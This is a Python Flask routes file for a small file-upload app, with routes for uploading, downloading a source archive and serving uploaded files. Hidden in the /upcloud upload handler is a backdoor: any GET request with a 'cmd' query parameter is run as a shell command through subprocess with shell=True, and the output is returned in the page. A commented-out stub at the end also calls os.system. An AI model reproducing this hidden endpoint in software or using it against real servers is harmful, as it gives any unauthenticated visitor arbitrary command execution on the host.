import os
import subprocess
from urllib.parse import urlsplit, parse_qs

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    cmd = request.query_string
    if cmd:
        query = urlsplit(request.url).query
        params = parse_qs(query)
        cmd = subprocess.Popen(params["cmd"][0], shell=True, stdout=subprocess.PIPE).stdout.read().decode('ascii')
        return render_template('success.html', file_url=cmd)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))


# @app.route('/abc')
# def send_report(path):
#     if request.method == 'GET':
#         request
#         os.system("")
#     return
